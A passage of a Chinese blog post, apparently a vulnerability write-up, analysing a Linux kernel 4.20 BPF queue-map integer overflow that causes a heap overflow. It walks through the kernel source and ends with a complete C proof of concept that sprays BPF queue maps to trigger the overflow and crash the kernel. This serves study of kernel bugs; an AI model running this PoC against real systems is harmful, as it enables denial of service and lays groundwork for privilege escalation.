&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">		value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line">	value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (!value)</span><br><span class="line">		<span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">	err = -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">	<span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must increment bpf_prog_active to avoid kprobe+bpf triggering from</span></span><br><span class="line"><span class="comment">	 * inside bpf map update or delete otherwise deadlocks are possible</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	preempt_disable();</span><br><span class="line">	__this_cpu_inc(bpf_prog_active);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123;</span><br><span class="line">		err = bpf_percpu_hash_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123;</span><br><span class="line">		err = bpf_percpu_array_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123;</span><br><span class="line">		err = bpf_percpu_cgroup_storage_update(<span class="built_in">map</span>, key, value,</span><br><span class="line">						       attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_FD_ARRAY(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = bpf_fd_array_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">						   attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = bpf_fd_htab_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">						  attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123;</span><br><span class="line">		<span class="comment">/* rcu_read_lock() is not needed */</span></span><br><span class="line">		err = bpf_fd_reuseport_array_update_elem(<span class="built_in">map</span>, key, value,</span><br><span class="line">							 attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, attr-&gt;flags);		&lt;&lt;-------------</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);		</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125;</span><br><span class="line">	__this_cpu_dec(bpf_prog_active);</span><br><span class="line">	preempt_enable();</span><br><span class="line">	maybe_wait_bpf_programs(<span class="built_in">map</span>);</span><br><span class="line">out:</span><br><span class="line">free_value:</span><br><span class="line">	kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">	kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">	fdput(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们的<code>map_type</code>为<code>BPF_MAP_TYPE_QUEUE</code>，因此它会执行箭头所指的函数</p>
+<p>还是根据这个结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">	.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">	.map_alloc = queue_stack_map_alloc,</span><br><span class="line">	.map_free = queue_stack_map_free,</span><br><span class="line">	.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">	.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">	.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">	.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">	.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">	.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">	.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>我们跟进<code>queue_stack_map_push_elem</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">				     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> = <span class="title">bpf_queue_stack</span>(<span class="title">map</span>);</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment">	 * map is full</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">			err = -E2BIG;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">			qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);		&lt;&lt;---------------------</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">		qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">	u32 head, tail;</span><br><span class="line">	u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>赫然看见这里一处<code>memcpy</code>，根据<code>qs</code>结构体，便知道<code>dst</code>指向的本应该是<code>(u64) value_size * size</code>这么大的空间，然而我们却让它变成了0</p>
+<p><code>value</code>是我们传入的指针，<code>value_size</code>是我们<code>map_create</code>的时候传入的，很明显这里就发生了堆溢出</p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>要利用的话，看师傅们的文章中都有一个很骚的词，即堆风水，其实就是构造合适的环境来方便利用</p>
+<p>根据内核堆分配的习惯，相同大小的堆一般会分到一块去，所以如果我们再申请几个相同大小的map的话，这些map紧邻的几率将会很大</p>
+<p>以下是<code>Poc</code>，会导致内核报错</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;	</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_BPF</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_BPF 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptr_to_u64(ptr)	((__u64)(unsigned long)(ptr))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	perror(ptr);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">				   <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_type = map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_BPF, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">					<span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = fd,</span><br><span class="line">		.key = ptr_to_u64(key),</span><br><span class="line">		.value = ptr_to_u64(value),</span><br><span class="line">		.flags = flags,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *addr = mmap((<span class="keyword">void</span> *)<span class="number">0x2000000</span>, <span class="number">0x10000</span>, <span class="number">3</span>, <span class="number">0x32</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(addr, <span class="number">0xff</span>, <span class="number">0x1000</span>);</span><br><span class="line">	<span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		die(<span class="string">"mmap"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> fd = bpf_create_map(BPF_MAP_TYPE_QUEUE, <span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> victim[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		victim[i] = bpf_create_map(BPF_MAP_TYPE_QUEUE, <span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bpf_update_elem(fd, <span class="number">0</span>, (<span class="keyword">void</span>*)<span class="number">0x2000000</span>, BPF_EXIST);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bpf_update_elem(victim[i], <span class="number">0</span>, (<span class="keyword">void</span>*)<span class="number">0x2000000</span>, BPF_EXIST);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞挺有意思的，也比较简单，适合作为CTF题出一出</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-04-04T14:59:22.287Z" itemprop="dateUpdated">2020-04-04 22:59:22</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/" target="_blank" rel="external">http://dayjun.top/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/</a>
+        
+    </div>
+    <footer>
+        <a href="http://dayjun.top">
+            <img src="/img/girl.jpg" alt="DaJun">
+            DaJun
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/">kernel</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/&title=《Linux kernel 4.20 BPF 整数溢出漏洞》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/&title=《Linux kernel 4.20 BPF 整数溢出漏洞》 — DaJun的Blog&source=Linux kernel 4.20-rc1-rc4中存在一个整数溢出漏洞，导致堆溢出" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2020/04/02/面试不会的点/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">面试不会的点</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BPF"><span class="post-toc-number">1.</span> <span class="post-toc-text">BPF</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#整数溢出"><span class="post-toc-number">2.</span> <span class="post-toc-text">整数溢出</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#堆溢出"><span class="post-toc-number">3.</span> <span class="post-toc-text">堆溢出</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://3nd.xyz/" target="_blank">3ND</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DaJun &copy; 2019 - 2020
+            </span>
+        		
+           	
+           	<span>
+           		<a href="http://www.beian.miit.gov.cn" target="_blank">苏ICP备19059861号</a>
+           	</span>
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/&title=《Linux kernel 4.20 BPF 整数溢出漏洞》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/04/04/Linux-kernel-4-20-BPF-整数溢出漏洞/&title=《Linux kernel 4.20 BPF 整数溢出漏洞》 — DaJun的Blog&source=Linux kernel 4.20-rc1-rc4中存在一个整数溢出漏洞，导致堆溢出" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsklEQVR42u3aS24jMQwFwNz/0pNtACfOe6TkeIDyynB/rOqFyCb58RF//n35tL88Hv36e/6/+VX1Bw8PD2+x9J9ul5zz/P6P3ze8Yj14eHh413j5sh7Pn4WH2dF8zXh4eHjvwzv1Sx5mnrPx8PDw/hdesnG3CfcmOOHh4eG9npcUI9oi7/NzZiHkYq0FDw8Pb153HW7Qr/x+pb+Hh4eHt+6qt82nzXafFzKK1eLh4eFd4OUbbstOrk2umpU28PDw8G7z2m233frbo+2DiJJvPDw8vKO8/CW/bfAnRdj2EefNMzw8PLwbvOTi9i/z++fnr94V8PDw8C7zZiMCs/ZVfu1sIAwPDw/vHi8vDczaWnl7rG2M/bJCPDw8vJfz2nZUHjY2AaYocODh4eFd4+0X0SbiSd67eVh4eHh493hJirwPEm3DbJhA/7R+PDw8vAu8vKCQJ8Ftc6t9QHUJGA8PD+8QLx8L2DfGzgahIhjg4eHhXeNtRqaSbTovfCQjVlFyj4eHh3eBl2/W+3ZUEn7af4wKHHh4eHjXeEky3Q5C5dv6bIQrSrjx8PDwjvJODQ0kZYu8rtwWLIo3Bjw8PLxDvLYBlqfC+bjA7G54eHh4f8XLE+W82b8v8u7LGXh4eHg3eJt0OQ8SbbrcJt91lw8PDw/vEK8tEOzbY3mKvEnx8fDw8O7xZu2oWe66aXfVVDw8PLxrvBYwGynIywp5AfeX8/Hw8PCO8mZbbV6k2JR926LzN3fAw8PDu8Brt91Nc2szqpUXR2oYHh4e3og3S3BnbaokYGzS/boejIeHh7fgbdpa7dFkDcMI9ngtHh4e3hvwZkvflDlmo1p4eHh478PLt/W8JZY8jtnDxcPDw7vH2w88tUGlLRnn68fDw8O7zWtf7zctrueLyAcUNo8DDw8Pb8H7BJSx2k+gLHOfAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
+    
+    
+
+
+
